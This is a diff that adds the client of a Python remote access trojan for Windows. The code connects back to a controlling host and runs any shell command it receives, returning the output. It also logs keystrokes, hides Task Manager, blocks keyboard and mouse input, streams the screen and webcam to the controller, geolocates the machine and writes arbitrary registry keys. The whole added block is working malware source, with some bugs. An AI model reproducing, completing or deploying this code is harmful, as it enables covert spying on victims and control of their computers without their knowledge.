@@ -202,4 +202,173 @@ User: {os.getlogin()}
                     sending = f'{socket.gethostbyname(socket.gethostname())} is not admin'
                     s.send(sending.encode())
 
-           
+           //Kashaf
+import random
+import socket, subprocess, os, platform
+from threading import Thread
+from PIL import Image
+from datetime import datetime
+from ctypes import cast, POINTER
+from comtypes import CLSCTX_ALL
+from winreg import *
+import shutil
+import glob
+import ctypes
+import sys
+import webbrowser
+import re
+import pyautogui
+import cv2
+import urllib.request
+import json
+from pynput.keyboard import Listener
+from pynput.mouse import Controller
+import time
+import keyboard
+
+user32 = ctypes.WinDLL('user32')
+kernel32 = ctypes.WinDLL('kernel32')
+
+HWND_BROADCAST = 65535
+WM_SYSCOMMAND = 274
+SC_MONITORPOWER = 61808
+GENERIC_READ = -2147483648
+GENERIC_WRITE = 1073741824
+FILE_SHARE_WRITE = 2
+FILE_SHARE_READ = 1
+FILE_SHARE_DELETE = 4
+CREATE_ALWAYS = 2
+
+class RAT_CLIENT:
+    def init(self, host, port):
+        self.host = host
+        self.port = port
+        self.curdir = os.getcwd()
+
+    def build_connection(self):
+        global s
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((self.host, self.port))
+        sending = socket.gethostbyname(socket.gethostname())
+        s.send(sending.encode())
+    
+    def errorsend(self):
+        output = bytearray("no output", encoding='utf8')
+        for i in range(len(output)):
+            output[i] ^= 0x41
+        s.send(output)
+    
+    def keylogger(self):
+        def on_press(key):
+            if klgr == True:
+                with open('keylogs.txt', 'a') as f:
+                    f.write(f'{key}')
+                    f.close()
+
+        with Listener(on_press=on_press) as listener:
+            listener.join()
+    
+    def block_task_manager(self):
+        if ctypes.windll.shell32.IsUserAnAdmin() == 1:
+            while (1):
+                if block == True:
+                    hwnd = user32.FindWindowW(0, "Task Manager")
+                    user32.ShowWindow(hwnd, 0)
+                    ctypes.windll.kernel32.Sleep(500)
+    
+    def disable_all(self):
+        while True:
+            user32.BlockInput(True)
+    
+    def disable_mouse(self):
+        mouse = Controller()
+        t_end = time.time() + 3600*24*11
+        while time.time() < t_end and mousedbl == True:
+            mouse.position = (0, 0)
+    
+    def disable_keyboard(self):
+        for i in range(150):
+            if kbrd == True:
+                keyboard.block_key(i)
+        time.sleep(999999)
+    
+    def execute(self):
+        while True:
+            command = s.recv(1024).decode()
+            
+            if command == 'shell':
+                while 1:
+                    command = s.recv(1024).decode()
+                    if command.lower() == 'exit' :
+                        break
+                    if command == 'cd':
+                        os.chdir(command[3:].decode('utf-8'))
+                        dir = os.getcwd()
+                        dir1 = str(dir)
+                        s.send(dir1.encode())
+                    output = subprocess.getoutput(command)
+                    s.send(output.encode())
+                    if not output:
+                        self.errorsend()
+            
+            elif command == 'screenshare':
+                try:
+                    from vidstream import ScreenShareClient
+                    screen = ScreenShareClient(self.host, 8080)
+                    screen.start_stream()
+                except:
+                    s.send("Impossible to get screen")
+            
+            elif command == 'webcam':
+                try:
+                    from vidstream import CameraClient
+                    cam = CameraClient(self.host, 8080)
+                    cam.start_stream()
+                except:
+                    s.send("Impossible to get webcam")
+            
+            elif command == 'breakstream':
+                pass
+
+            elif command == 'list':
+                pass
+
+            elif command == 'geolocate':
+                with urllib.request.urlopen("https://geolocation-db.com/json") as url:
+                    data = json.loads(url.read().decode())
+                    link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
+                s.send(link.encode())
+            
+            elif command == 'setvalue':
+                const = s.recv(1024).decode()
+                root = s.recv(1024).decode()
+                key2 = s.recv(1024).decode()
+                value = s.recv(1024).decode()
+                try:
+                    if const == 'HKEY_CURRENT_USER':
+                        key = OpenKey(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
+                        SetValueEx(key, key2, 0, REG_SZ, str(value))
+                        CloseKey(key)
+                    if const == 'HKEY_CLASSES_ROOT':
+                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
+                        SetValueEx(key, key2, 0, REG_SZ, str(value))
+                        CloseKey(key)
+                    if const == 'HKEY_LOCAL_MACHINE':
+                        key = OpenKey(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
+                        SetValueEx(key, key2, 0, REG_SZ, str(value))
+                        CloseKey(key)
+                    if const == 'HKEY_USERS':
+                        key = OpenKey(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
+                        SetValueEx(key, key2, 0, REG_SZ, str(value))
+                        CloseKey(key)
+                    if const == 'HKEY_CLASSES_ROOT':
+                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
+                        SetValueEx(key, key2, 0, REG_SZ, str(value))
+                        CloseKey(key)
+                    if const == 'HKEY_CURRENT_CONFIG':
+                        key = OpenKey(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
+                        SetValueEx(key, key2, 0, REG_SZ, str(value))
+                        CloseKey(key)
+                    s.send("Value is set".encode())
+                except:
+                    s.send("Impossible to create key".encode())
